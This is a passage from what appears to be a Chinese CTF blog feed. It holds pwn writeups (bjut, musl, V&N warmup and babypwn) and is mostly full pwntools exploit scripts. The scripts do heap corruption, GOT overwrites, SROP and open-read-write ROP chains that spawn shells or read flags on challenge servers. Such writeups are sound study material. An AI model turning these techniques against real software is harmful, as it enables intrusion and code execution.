#1</span><br><span class="line">        free(1) #2</span><br><span class="line">        add(0x40,&apos;bbbb&apos;) #0</span><br><span class="line">        edit(0,0x60,&apos;a&apos;*0x40+p64(0)+p64(0x71)+p16(iofile_off[0]))</span><br><span class="line">        add(0x60,&apos;aaaa&apos;) # 2</span><br><span class="line">        add(0x60,&apos;aaa&apos;+p64(0)*6+p64(0xfbad1800)+p64(0)*3+&quot;\x00&quot;) #3</span><br><span class="line">        io.recv(0x40)</span><br><span class="line">        leak=u64(io.recv(8))</span><br><span class="line">        info(hex(leak))</span><br><span class="line">        libc.address = leak-(0x7f35bc64a600-0x7f35bc285000)</span><br><span class="line">        log.success(hex(libc.address))</span><br><span class="line">        malloc_hook = libc.sym[&apos;__malloc_hook&apos;]</span><br><span class="line">        free_hook = libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">        one = libc.address+onegadgets[1]</span><br><span class="line">        log.success(hex(malloc_hook))</span><br><span class="line"></span><br><span class="line">        add(0x60,&apos;cccc&apos;)#4</span><br><span class="line">        add(0x60,&apos;dddd&apos;)#5</span><br><span class="line">        free(5)</span><br><span class="line">        edit(0,0x100,0xa0*&apos;\x17&apos;+p64(0)+p64(0x71)+p64(malloc_hook-0x23))</span><br><span class="line">        add(0x60,&apos;bbbb&apos;)</span><br><span class="line">        add(0x60,&apos;d&apos;*0xb+p64(one)+p64(libc.symbols[&quot;realloc&quot;]+13))</span><br><span class="line">        choice(1)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;, str(60))</span><br><span class="line">        io.interactive()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure></p><h2 id="bjut"><a href="#bjut" class="headerlink" title="bjut"></a>bjut</h2><p>got表可写，pie没开</p><h3 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>show 和 edit功能，可以输入负数，造成数组上溢。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;The index of your hw:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 &lt;= 15 &amp;&amp; qword_404140[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Input your hw:&quot;);</span><br><span class="line">    read(0, qword_404140[v1], dword_4040E0[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;out of range!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>通过数组上溢泄露free_got内容，然后修改 free_got为system，然后释放/bin/sh的堆块</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h2 id="musl"><a href="#musl" class="headerlink" title="musl"></a>musl</h2><p>做这个题的时候当时是蒙的，使用的是musl libc跟平时的glibc有很大差异。其中最大的差异是muls不支持延迟绑定，没有 malloc_hook等<br>具体参考 <a href="https://my.oschina.net/u/2306127/blog/1592004" target="_blank" rel="noopener">https://my.oschina.net/u/2306127/blog/1592004</a></p><h3 id="漏洞点-3"><a href="#漏洞点-3" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>add功能有一次堆溢出的机会</p><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>溢出修改size然后free造成overlapping<br>free时检查了in_use和下一个chunk的prev_size，提前伪造好prev_size<br>overlapping后再取出来，可以uaf，free chunk的链表头部在libc，uaf之后show泄露libc地址，然后edit把fd和bk改为0x602030，利用双向链表写fd bk的操作把一个堆地址写入0x602040，将heap_store劫持到堆上，实现任意地址读写<br>show和edit的次数有限制，但是可以通过任意地址读写覆盖计数器<br>got plt都不可写，没有hook<br>可以通过任意地址读写改写栈，getshell<br>利用任意地址读，读libc中的environ泄露栈地址，算出栈顶地址，然后利用任意地址写覆盖返回地址</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">r=process([&apos;./libc.so&apos;,&apos;./carbon&apos;])</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line">else:</span><br><span class="line">r=remote(&apos;119.3.158.103&apos;,19008)</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;wdnmd&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def gg_add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;Y\x00&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;2&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;3&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line">    sleep(0.5)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;4&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">heap_store = 0x602030</span><br><span class="line">#add-symbol-file libc.so 0x8000000</span><br><span class="line">#x/64gx 0x82953b0</span><br><span class="line">#x/20gx 0x00007fffff7e0000</span><br><span class="line">add(0x10,&apos;gg&apos;)#0</span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x50,p64(0)*6+p64(0x81)+p64(0xa1))#2</span><br><span class="line">add(0x40,&apos;gg&apos;)#3</span><br><span class="line">add(0x20,&apos;gg&apos;)#4</span><br><span class="line">add(0x20,p64(0x40)+p64(heap_store))#5</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">gg_add(0x10,&apos;a&apos;*0x10+p64(0x21)+p64(0x81))#0</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x30,&apos;gg&apos;)#2 6</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">show(6)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">info(hex(leak))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">libc_base = leak-0x292ad8</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">system = libc_base+libc.sym[&apos;system&apos;]</span><br><span class="line">edit(6,p64(heap_store)*2)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">add(0x30,p64(heap_store))#pwn</span><br><span class="line">environ = libc_base+0x294FD8</span><br><span class="line">log.success(hex(environ))</span><br><span class="line"></span><br><span class="line">add(0x60,p64(0x71)+p64(environ)+p64(0x71)+p64(libc_base+0x8295570-0x8000000))# environ 9 </span><br><span class="line">edit(5,p64(0))</span><br><span class="line">show(9)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">stack_rsp = leak-0x118</span><br><span class="line">log.success(hex(stack_rsp))</span><br><span class="line">#gg_stack = 0x7ffffffee638</span><br><span class="line">#print(hex(gg_stack-stack_rsp))</span><br><span class="line">gg_stack = 0xa0+stack_rsp</span><br><span class="line">binsh = libc.search(&apos;/bin/sh\x00&apos;).next()+libc_base</span><br><span class="line">edit(10,p64(0x71)+p64(gg_stack)+&apos;/bin/sh&apos;.ljust(8,&apos;\x00&apos;)+p64(0)+p64(0x41)+p64(binsh))</span><br><span class="line">edit(5,p64(0))</span><br><span class="line">#show(12) test libc_addr</span><br><span class="line">pause()</span><br><span class="line">menu = 0x400c2f</span><br><span class="line">flag = libc_base+0x8295580-0x8000000</span><br><span class="line">pop_rdi_ret = libc_base+0x14862</span><br><span class="line">pop_rsi_ret = libc_base+0x1c237</span><br><span class="line">pop_rdx_ret = libc_base+0x1b92</span><br><span class="line"></span><br><span class="line">puts_addr = libc_base+libc.sym[&apos;puts&apos;]</span><br><span class="line">#edit(10,p64(menu)*10)</span><br><span class="line">edit(10,p64(menu)+p64(pop_rdi_ret)+p64(flag)+p64(system)+p64(menu))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;easyheap&quot;&gt;&lt;a href=&quot;#easyheap&quot; class=&quot;headerlink&quot; title=&quot;easyheap&quot;&gt;&lt;/a&gt;easyheap&lt;/h2&gt;&lt;p&gt;程序没开PIE，got表可写&lt;/p&gt;
&lt;h3 id=&quot;漏洞点&quot;&gt;&lt;a href=&quot;#漏洞点&quot;
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>V&amp;N招新赛writeup</title>
    <link href="https://nocbtm.github.io/2020/03/02/V&amp;N%E6%8B%9B%E6%96%B0%E8%B5%9Bwriteup/"/>
    <id>https://nocbtm.github.io/2020/03/02/V&amp;N招新赛writeup/</id>
    <published>2020-03-02T08:47:00.000Z</published>
    <updated>2020-04-23T04:00:50.792Z</updated>
    
    <content type="html"><![CDATA[<h1 id="V-amp-N招新赛writeup"><a href="#V-amp-N招新赛writeup" class="headerlink" title="V&amp;N招新赛writeup"></a>V&amp;N招新赛writeup</h1><p>参考链接:<a href="https://www.lhyerror404.cn/2020/03/01/vn-%e8%80%83%e6%a0%b8%e8%b5%9b-writeup/" target="_blank" rel="noopener">https://www.lhyerror404.cn/2020/03/01/vn-%e8%80%83%e6%a0%b8%e8%b5%9b-writeup/</a></p><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>题目首先给了puts函数的地址，可得出libc基址，比赛的时候老想着用栈迁移，但stack_addr是随机的，难度比较大。赛后看了小蓝师傅的博客，又学到了新姿势，返回地址覆盖成ret之后，执行两次ret，刚好返回到第一次输入的地方。然后进行ROP，这题用了prtctl函数把execve禁了，可以用open(flag),read(flag,libc_addr+0x3C6500,0x40),write(1,flag,0x40)获取到flag</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'vn.node3.buuoj.cn'</span>,<span class="number">52275</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"gift: 0x"</span>)</span><br><span class="line"></span><br><span class="line">puts_addr=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">info(hex(puts_addr))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">libc_addr=puts_addr-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">info(hex(libc_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'Input something: '</span>)</span><br><span class="line">pop_rdi=<span class="number">0x21102</span></span><br><span class="line">pop_rsi=<span class="number">0x202e8</span></span><br><span class="line">pop_rax=<span class="number">0x33544</span></span><br><span class="line">pop_rdx=<span class="number">0x1b92</span></span><br><span class="line">syscall_ret=<span class="number">0xbc375</span></span><br><span class="line">ret=<span class="number">0x937</span></span><br><span class="line">payload = p64(libc_addr+pop_rdi)+p64(<span class="number">0</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6500</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(libc_addr+<span class="number">0x3C6500</span>)+p64(libc_addr+pop_rsi)+p64(<span class="number">0</span>)+p64(libc_addr+libc.sym[<span class="string">'open'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(<span class="number">3</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6600</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(<span class="number">1</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6600</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'write'</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name?'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(libc_addr+ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(<span class="string">'flag\x00\x00\n'</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><p>SROP参考:<a href="https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/#srop" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/#srop</a><br>这道题还是借鉴小蓝师傅的做法<br>程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./vn_pwn_babypwn_1 </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0d</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) goto <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0a</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x09</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x08</span> <span class="number">0x00</span> <span class="number">0x0000000a</span>  <span class="keyword">if</span> (A == mprotect) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x00000029</span>  <span class="keyword">if</span> (A == socket) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x0000002a</span>  <span class="keyword">if</span> (A == connect) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000031</span>  <span class="keyword">if</span> (A == bind) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000032</span>  <span class="keyword">if</span> (A == listen) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000038</span>  <span class="keyword">if</span> (A == clone) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000039</span>  <span class="keyword">if</span> (A == fork) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch='i386'</span></span><br><span class="line"></span><br><span class="line">vn_pwn_babypwn_1=ELF(<span class="string">'./vn_pwn_babypwn_1'</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">'i386'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib32/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span><span class="params">(other_libc = null)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        <span class="keyword">if</span> other_libc <span class="keyword">is</span> <span class="keyword">not</span> null:</span><br><span class="line">            libc = ELF(<span class="string">"./"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">"./vn_pwn_babypwn_1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False)</span>:</span></span><br><span class="line">    sh.recvuntil(start_string)</span><br><span class="line">    <span class="keyword">if</span> int_mode :</span><br><span class="line">        return_address=int(sh.recvuntil(end_string).strip(end_string),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(info+str(hex(return_address+offset)))</span><br><span class="line">    <span class="keyword">return</span> return_address+offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">return</span> sh.recvrepeat(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gdb</span><span class="params">(sh,stop=False)</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    <span class="keyword">if</span> stop :</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 